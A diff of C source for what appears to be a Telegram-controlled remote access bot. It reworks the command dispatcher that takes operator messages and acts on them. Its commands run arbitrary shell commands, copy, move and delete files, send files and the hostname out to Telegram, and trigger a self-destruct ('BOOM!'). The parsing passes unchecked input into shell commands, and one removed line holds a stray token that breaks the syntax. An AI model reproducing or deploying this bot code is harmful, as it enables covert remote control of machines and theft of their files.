@@ -152,70 +152,79 @@ int main(int argc , char *argv[])
     fp = popen("rm error.txt","r");
 }
 void *changecommand(char *id,char *text) {
-    char text_build[4000], command_detail[500],temp_text[2000];
+    char text_build[4000], command[4000],cmdArg[4000];
     char path[4000], pName[4000];
     int start_index, index = 0, length;
+    int space_loc;
 
     getNowPath(path);
     getpName(pName);
 
     strcpy(text_build, text);
     length = strlen(text);
-    memset(text, 0, 4000);
-    memset(command_detail, 0, 500);
+    for(start_index=0; start_index < length; start_index++) {
+        if(text_build[start_index] == ' ' ){
+            space_loc = start_index;
+            break;
+        }
+    }
+    strncpy(command,text_build+1,space_loc);
+    command[space_loc-1] = '\0';
+    printf("%s\n",command);
+    strncpy(cmdArg, text_build+space_loc,length-space_loc);
+    printf("%s",cmdArg);
+    cmdArg[length] = '\0';
+    bzero(text_build,4000);
 
-    if(text_build[0] == '/') {
-        start_index = 1;
-    } else {
-        start_index = 0;
+    if(strcmp(command, "shell") == 0)
+    {
+        sprintf(text_build, "%s",cmdArg);
+        exeCMD(text_build);
+        // strcpy(command_detail, "Exec shell commands with timeout.");
     }
-    
-    for(start_index; start_index < length; start_index++) {
-        text[index] = text_build[start_index];
-        index += 1;
-        if(strcmp(text, "shell ") == 0) Home{
-            memset(text, 0, 4000);
-            index = 0;
-            // strcpy(command_detail, "Exec shell commands with timeout.");
-        }else if(strcmp(text, "mvbot ") == 0) {
-            memset(text, 0, 4000);
-            index = 0;
-            strcpy(command_detail, "Move bot to custom location.");
-        }else if(strcmp(text, "timeout ") == 0) {
-            memset(text, 0, 4000);
-            index = 0;
-            strcpy(command_detail, "Set timeout for shell.");
-        } else if(strcmp(text, "help") == 0) {
-            strcpy(command_detail, "List of commands.");
-        }
-        else if(strcmp(text, "cp") == 0) {
-            strcpy(command_detail, "Copy file/folder.");
-        }
-        else if(strcmp(text, "mv") == 0) {
-            strcpy(command_detail, "Move file/folder.");
-        }
-        else if(strcmp(text, "rm") == 0) {
-            strcpy(command_detail, "Remove file/folder.");
-        }
-        else if(strcmp(text, "mkdir") == 0) {
-            strcpy(command_detail, "Make directory.");
-        }
-        else if(strcmp(text, "getfile ") == 0) {
-            strcpy(command_detail, "Download file from bot.");
-            telegram_send_file(id,text);
-        }
-        else if(strcmp(text, "BOOM!") == 0) {
-            strcpy(command_detail, "DESTROY ITSELF!");
-            boom(path,pName);
-        }
-        else if(strcmp(text, "gethostname") == 0) {
-            strcpy(command_detail, "Get hostname of client.");
-            getHostname(temp_text);
-            telegram_send_msg(id,temp_text);
-        }
-        printf("%s", command_detail);
-        memset(command_detail, 0, 500);
+    else if(strcmp(command, "timeout") == 0)
+    {
+        // Setting timeout for exeCMD;
+        //ADD Later
     }
-    index = 0;
+    else if(strcmp(command, "cp") == 0)
+    {
+        sprintf(text_build, "%s%s",command,cmdArg);
+        exeCMD(text_build);
+        // strcpy(command_detail, "Exec shell commands with timeout.");
+    }
+    else if(strcmp(command, "mv") == 0)
+    {
+        sprintf(text_build, "%s%s",command,cmdArg);
+        exeCMD(text_build);
+        // strcpy(command_detail, "Exec shell commands with timeout.");
+    }
+    else if(strcmp(command, "rm") == 0)
+    {
+        sprintf(text_build, "%s%s",command,cmdArg);
+        exeCMD(text_build);
+        // strcpy(command_detail, "Exec shell commands with timeout.");
+    }
+    else if(strcmp(command, "mkdir") == 0)
+    {
+        sprintf(text_build, "%s%s",command,cmdArg);
+        exeCMD(text_build);
+        // strcpy(command_detail, "Exec shell commands with timeout.");
+    }
+    else if(strcmp(command, "getfile") == 0)
+    {
+        telegram_send_file(id,cmdArg);
+        // strcpy(command_detail, "Exec shell commands with timeout.");
+    }
+    else if(strcmp(command, "BOOM!") == 0)
+    {
+        boom(path,pName);
+    }
+    else if(strcmp(command, "gethostname") == 0) {
+        getHostname(text_build);
+        telegram_send_msg(id,text_build);
+    }
+
 }
+
 
